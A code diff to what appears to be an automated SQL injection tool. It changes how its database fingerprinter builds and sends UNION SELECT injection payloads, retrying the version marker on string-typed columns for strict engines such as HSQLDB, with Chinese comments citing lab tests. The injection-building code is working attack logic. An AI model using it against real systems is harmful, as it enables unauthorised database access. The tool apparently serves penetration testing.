@@ -83,20 +83,38 @@ export class DBFingerprinter {
         // 协议兼容库（MariaDB/TiDB→MySQL，DM8→Oracle）复用对应 WRAP 分支
         const wrapKey = dbms === 'MariaDB' || dbms === 'TiDB' ? 'MySQL' : dbms === 'DM8' ? 'Oracle' : dbms;
         const nulls = nullSequence(columns).split(',');
-        const idx = echoCols[0];
-        const cols = nulls
-          .map((_, i) => (i === idx ? ((ctx.config?.noCast && WRAP_NOCAST[wrapKey]) ? WRAP_NOCAST[wrapKey](info.func) : WRAP[wrapKey](info.func)) : 'NULL'))
-          .join(',');
-        // UNION SELECT 的伪表：Oracle/DM8→dual，DB2/Firebird/Informix→各自专属伪表，其余省略
-        const fromDummySql = resolveFromClause(dbms, ctx?.config?.unionFrom);
-        // [CRS-FIX 2026-09-10] 补闭合前缀（同 ORDER BY 探针）：否则 UNION 整句落在引号内
-        const payload = `${point.originalValue || '1'}${boundary} UNION SELECT ${cols}${fromDummySql}-- -`;
-        const sent = obf(payload);
-        const res = await sendInjection(
-          httpClient,
-          ctx,
-          buildInjectionRequest(target, point, sent)
-        );
+        // [TYPE-FIX 2026-09-20] 标记必须落在**字符型**回显列上，而原实现无条件用 echoCols[0]。
+        // 真引擎实测（e2e/multi-engine-lab NO_WAF=1，HSQLDB 2.7.3）：同一条 UNION 探针
+        //   放第 1 列（name VARCHAR）→ 正常回显 `__S__HSQLDB 103__E__`
+        //   放第 0 列（id INTEGER） → `incompatible data types in combination`，整条 UNION 报错
+        // 也就是严格类型库上版本回显定库**恒失败**，而且失败得和"探针跑不动"一模一样（echo=N）。
+        // H2 之所以能过，是因为它以 MODE=MySQL 运行、会隐式转类型——不是引擎判据对了。
+        //
+        // 代价考虑：不能对所有 18 个候选都试多个列（每多试一列 = 每候选多 1 请求，实测本
+        // 靶场 206 请求会涨到 ~240）。所以只对**声明了 `from` 的候选**（HSQLDB/Derby 这类
+        // 已知需要走字符列的严格类型库）换列重试；其余 16 个库的请求数与形状一字不变。
+        const tryCols = info.from ? echoCols : [echoCols[0]];
+        for (const idx of tryCols) {
+          const cols = nulls
+            .map((_, i) => (i === idx ? ((ctx.config?.noCast && WRAP_NOCAST[wrapKey]) ? WRAP_NOCAST[wrapKey](info.func) : WRAP[wrapKey](info.func)) : 'NULL'))
+            .join(',');
+          // UNION SELECT 的伪表：Oracle/DM8→dual，DB2/Firebird/Informix→各自专属伪表，其余省略
+          // [EXCL-FIX 2026-09-20] 若该条目自带 `from`，它**优先于**方言伪表与用户 --union-from：
+          // 这类探针的区分力整个建立在"这个 FROM 只在自家库存在"上，被覆盖掉就退化成
+          // 一条谁都能执行的常量串——正是 2026-09-16 DB2 误判事故的那个形状。
+          // 所以这里不是优先级疏忽，是判据的一部分；用户显式 --union-from 对这些条目无效，
+          // 由 DB_VERSION 注释与本行共同说明。
+          const fromDummySql = info.from
+            ? ` ${info.from}`
+            : resolveFromClause(dbms, ctx?.config?.unionFrom);
+          // [CRS-FIX 2026-09-10] 补闭合前缀（同 ORDER BY 探针）：否则 UNION 整句落在引号内
+          const payload = `${point.originalValue || '1'}${boundary} UNION SELECT ${cols}${fromDummySql}-- -`;
+          const sent = obf(payload);
+          const res = await sendInjection(
+            httpClient,
+            ctx,
+            buildInjectionRequest(target, point, sent)
+          );
         // [ECHO-FIX 2026-09-18] 先剔除「响应里回显的本条 payload」，再取 `__S__…__E__` 标记。
         // 目标把注入值原样打回页面时（实测 blackbox-lab 真 MySQL 回显 `sql=…`），页面里会出现
         // **两份**标记：一份来自被回显的 SQL 文本本身（`__S__',CAST((version()) AS CHAR),'__E__`），
@@ -114,6 +132,7 @@ export class DBFingerprinter {
           // [P1-FIX 2026-09-05] 一并返回解析后的版本：原实现拿到版本串只用于定库即丢弃，
           // 引擎无法按版本选 payload/枚举 SQL（MSSQL<2017 无 string_agg、MySQL<5.7 用 password 列）
           return { dbms, version: parseDbmsVersion(dbms, ver), baseline: baselineResp };
+        }
         }
       }
     }
